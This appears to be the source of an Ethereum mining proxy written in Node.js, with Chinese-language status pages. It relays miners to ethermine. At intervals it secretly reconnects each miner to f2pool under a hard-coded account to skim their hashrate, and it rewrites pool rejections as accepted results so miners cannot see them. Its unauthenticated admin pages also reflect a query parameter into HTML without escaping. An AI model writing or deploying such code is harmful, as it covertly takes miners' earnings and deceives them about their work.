var net = require('net');
var http = require('http');
//var tls = require('tls');
//var fs = require("fs");
const path = require('path');
var isssl = false;
var iscs = true;
var csstr = '';
const trim = require('lodash/trim');
var express = require('express');
var app = express();
var csaddress = 'qq115411';
var gongzuo = Buffer.from('{"id":2,"method":"eth_getWork","params":[]}\n');
var suanliarr = {};
var dk = 14444;
var dk2 = 14444;
var dk3 = 8081;
var csbl = 1.1;
var ym = 'asia2.ethermine.org';
var qs = require('querystring');
var bmd = false;
var bmdlist = [];
var bmdstr = '';
var cssever;

function errorHandler(err, req, res, next) {}
app.use(errorHandler);
app.all("*", function (req, res, next) {
    res.header("Access-Control-Allow-Origin", '*')
    res.header("Access-Control-Allow-Headers", 'content-type');
    next();
})
// var options = {
//     key: fs.readFileSync(path.join(__dirname, 'dist')+'/1.key'),
//     cert: fs.readFileSync(path.join(__dirname, 'dist')+'/1.pem'),
// };
app.get('/s', function (req, res) {
    try {
        res.send(getlen3())
    } catch (err) {
        res.send('报错了')
        console.log(err)
    }

})
app.get('/clear', function (req, res) {
    csstr = '';
    res.send('已清除记录');
})
app.get('/cs', function (req, res) {
    try {
        if (iscs) {
            res.send('<br><a href="/clear">清除记录</a><br>抽水地址：<br>' + csaddress + '<br>抽水比例：' 
+ csbl + '%<br>单次抽水时长：60秒<br>抽水循环：' + parseInt(6000 / csbl) + '秒<br>抽水记录：<br><br>' + csstr)
        } else {
            res.send('未启用抽水')
        }
    } catch (err) {
        res.send('报错了')
        console.log(err)
    }

})
app.get('/', function (req, res) {
    try {
        var getaddress = req.query.address;
        if (getaddress) {
            res.send('<center><table border="1"><tr><td>序号</td><td>矿机名</td><td>上报算力</td><td>最近>连接</td><td>最后提交</td><td>在线</td></tr>' + getlen2(getaddress) + '</table>')
        } else {
            let gett = getlen()
                res.send('当前进程pid：' + process.pid + '<br>'
                     + '当前内存占用：' + (process.memoryUsage().rss / 1024 / 1024).toFixed(2) + 'MB' + '<br>'
                     + '当前设置：<br>是否启用ssl：' + (isssl ? '是' : '否') + '<br>'
                     + '本地端口：' + dk + '<br>'
                     + '远程端口：' + dk2 + '<br>'
                     + '矿池域名或IP：' + ym + '<br>'
                     + '挖矿地址：' + (isssl ? 'stratum+ssl://' : '') + req.rawHeaders[1].split(':')[0] + 
':' + dk + '<br>'
                     + '是否开启白名单：' + (bmd ? '是' : '否') + '<br>'
                     + '白名单列表：<br>' + bmdstr + '<br>'
                     + '当前在线矿机：' + gett.count + '台<br>'
                     + '当前在线地址：<br>'
                    +gett.arr);
        }
    } catch (err) {
        res.send('报错了')
        console.log(err)
    }
})
var devdo = false;
var dur = parseInt(6000 / csbl);
function devstart() {
    if (iscs) {
        devdo = true;
        setTimeout(function () {
            csstr += gettime() + ' ' + '开始抽水60秒，周期' + dur + '秒<br>';
        }, 60000)
        setTimeout(function () {
            devdo = false;
            setTimeout(function () {
                csstr += gettime() + ' ' + '结束抽水，下次抽水' + (dur - 60) + '秒后<br>'
            }, 60000)
        }, 60 * 1000);
        setTimeout(function () {
            devstart()
        }, dur * 1000);
    } else {
        console.log(gettime() + ' ' + '不抽水')
    }
}
setTimeout(function () {
    devstart()
}, 300000);
function getlen() {
    let count = 0;
    let addresslist = [];
    let addresslistarr = '';
    try {
        for (var key in suanliarr) {
            if (suanliarr[key] && suanliarr[key].o == true) {
                count++
                if (!addresslist.includes(suanliarr[key].a)) {
                    addresslist.push(suanliarr[key].a)
                    addresslistarr += '<a href="?address=' + suanliarr[key].a + '">' + suanliarr[key].a + 
'</a><br>';
                }
            }

        }
        addresslistarr += '<br><a href="/s">合计</a><br>';
    } catch (err) {
        console.log(err)
    }

    return {
        count: count,
        arr: addresslistarr
    }
}
function getlen3(address) {
    let backstr = '';
    let slqh = 0;
    let iii = 1;
    let slhj = 0;
    try {
        for (var key in suanliarr) {
            if (suanliarr[key].o == true) {
                slhj = (parseFloat(slhj) + parseFloat(suanliarr[key].h.slice(0, suanliarr[key].h.length - 
1))).toFixed(2)
            }
        }
        backstr += '合计:' + slhj + 'M'
    } catch (err) {
        console.log(err)
    }
    return backstr
}
function getlen2(address) {
    let backstr = '';
    let slqh = 0;
    let iii = 1;
    let slhj = 0;
    try {
        for (var key in suanliarr) {
            if (suanliarr[key].a == address) {
                backstr = backstr +
                    '<tr>' +
                    '<td>' +
                    iii +
                    '</td>' +
                    '<td>' +
                    suanliarr[key].n +
                    '</td>' +
                    '<td>' +
                    suanliarr[key].h +
                    '</td>' +
                    '<td>' +
                    (((new Date().getTime()) - suanliarr[key].t1) / 1000).toFixed(2) + '秒前' +
                    '</td>' +
                    '<td>' +
                    (((new Date().getTime()) - suanliarr[key].t2) / 1000).toFixed(2) + '秒前' +
                    '</td>' +
                    '<td>' +
                    (suanliarr[key].o ? '在线' : '离线') +
                    '</td>' +
                    '</tr>';
                slqh = (parseFloat(slqh) + parseFloat(suanliarr[key].h.slice(0, suanliarr[key].h.length - 
1))).toFixed(2)
                iii++
            }
        }
        backstr += '<tr><td>合计</td><td colspan="5">' + slqh + 'M</td></tr>'
    } catch (err) {
        console.log(err)
    }

    return backstr
}

function gettime() {
    return new Date().toLocaleString().replace(/:\d{1,2}$/, ' ');
}
var server;

function startserver() {
    try {
        server = net.createServer(function (client) {
            //client.setEncoding('utf8');
            var data3 = [];
            var ser;
            ser = net.connect({
                port: dk2,
                host: ym
            }, function () {
                this.on('data', function (data) {
                    try {
                        data.toString().split('\n').forEach(jsonDataStr => {
                            if (trim(jsonDataStr).length) {

                                let data2 = JSON.parse(trim(jsonDataStr));
                                if (data2.result == false) {
                                    client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'))
                                } else {
                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                }
                            }
                        })
                    } catch {
                        client.write(data)
                    }
                })
                this.on('error', function (err) {
                    console.log('ser_err9', err)
                });
            })
            var clidevdo = false;
            client.on('data', function (data) {
                if (data3.length != 0) {
                    setTimeout(function () {
                        try {
                            suanliarr[data3[0] + '.' + data3[1]].o = true;
                            suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                            setTimeout(function () {
                                try {
                                    if (((new Date().getTime()) - suanliarr[data3[0] + '.' + data3[1]].t1)
 > 250000) {
                                        suanliarr[data3[0] + '.' + data3[1]].o = false;
                                    }

                                } catch (err444) {
                                    console.log(err444)
                                }

                            }, 300000)
                        } catch (err4443) {
                            console.log(err4443)
                        }
                    }, 20)
                }
                try {
                    data.toString().split('\n').forEach(jsonDataStr => {
                        if (trim(jsonDataStr).length) {
                            let data2 = JSON.parse(trim(jsonDataStr));
                            if (data2.method == 'eth_submitLogin') {
                                data3 = data2.params[0].split('.');
                                if (!data3[1]) {
                                    data3[1] = data2.worker;
                                }
                                suanliarr[data3[0] + '.' + data3[1]] = {};
                                suanliarr[data3[0] + '.' + data3[1]].a = data3[0];
                                suanliarr[data3[0] + '.' + data3[1]].o = true;
                                suanliarr[data3[0] + '.' + data3[1]].n = data3[1];
                                suanliarr[data3[0] + '.' + data3[1]].h = '0M';
                                suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                            } else if (data3.length != 0) {
                                if (data2.method == 'eth_getWork') {
                                    suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                    ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                } else {
                                    if (data2.method == 'eth_submitHashrate') {
                                        suanliarr[data3[0] + '.' + data3[1]].h = parseFloat(parseInt(data2
.params[0], 16) / 1000000).toFixed(2) + 'M';
                                        suanliarr[data3[0] + '.' + data3[1]].t1 = new Date().getTime();
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    } else if (data2.method == 'eth_submitWork') {
                                        suanliarr[data3[0] + '.' + data3[1]].t2 = new Date().getTime();
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                        if (devdo && !clidevdo) {
                                            clidevdo=true;
                                            ser.end()
                                            ser.destroy();
                                            ser = net.connect({
                                                port: '6688',
                                                host: 'eth.f2pool.com'
                                            }, function () {
                                                this.on('data', function (data) {
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr =>
 {
                                                            if (trim(jsonDataStr).length) {

                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                                                if (data2.result == false) {
                                                                    client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'))
                                                                } else {
                                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                                }
                                                            }
                                                        })
                                                    } catch {
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err10', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"devfeeget1","params":["' + csaddress + '","x"],"jsonrpc":"2.0"}\n'))
                                                setTimeout(function () {
                                                    ser.write(gongzuo)
                                                }, 10)
                                            })
                                        } else if (!devdo && clidevdo) {
                                            clidevdo=false;
                                            ser.end()
                                            ser.destroy();
                                            ser = net.connect({
                                                port: dk2,
                                                host: ym
                                            }, function () {
                                                this.on('data', function (data) {
                                                    try {
                                                        data.toString().split('\n').forEach(jsonDataStr =>
 {
                                                            if (trim(jsonDataStr).length) {

                                                                let data2 = JSON.parse(trim(jsonDataStr));
                                                                if (data2.result == false) {
                                                                    client.write(Buffer.from('{"id":' + data2.id + ',"jsonrpc":"2.0","result":true}\n'))
                                                                } else {
                                                                    client.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                                                }
                                                            }
                                                        })
                                                    } catch {
                                                        client.write(data)
                                                    }
                                                })
                                                this.on('error', function (err) {
                                                    console.log('ser_err8', err)
                                                });
                                                ser.write(Buffer.from('{"id":1,"method":"eth_submitLogin","worker":"' + data3[1] + '","params":["' + data3[0] + '","x"],"jsonrpc":"2.0"}\n'))
                                                setTimeout(function () {
                                                    ser.write(gongzuo)
                                                }, 10)
                                            })
                                        }

                                    } else {
                                        ser.write(Buffer.from(JSON.stringify(data2) + '\n'))
                                    }
                                }

                            } else {
                                client.end()
                                client.destroy()
                            }
                        }
                    });
                } catch (err) {
                    console.log(err.message)
                    console.log('2', data.toString())
                    try {
                        if (devdo) {
                            cssever.write(data)
                        } else {
                            ser.write(data)
                        }
                    } catch (err343) {
                        console.log(err343)
                    }
                }
            });
            client.on('error', function (err) {});
            client.on('close', function (err) {});
        });
        server.listen(dk, '0.0.0.0', function () {
            server.on('close', function () {});
            server.on('error', function (err) {});
        });
    } catch (err0101) {
        console.log('serverdown', err0101)
        setTimeout(function () {
            startserver()
        }, 15000)
    }
}
startserver()
try {
    app.listen(dk3)
} catch (err) {
    console.log('admindown', err)
    app.listen(dk3 + 1)
}
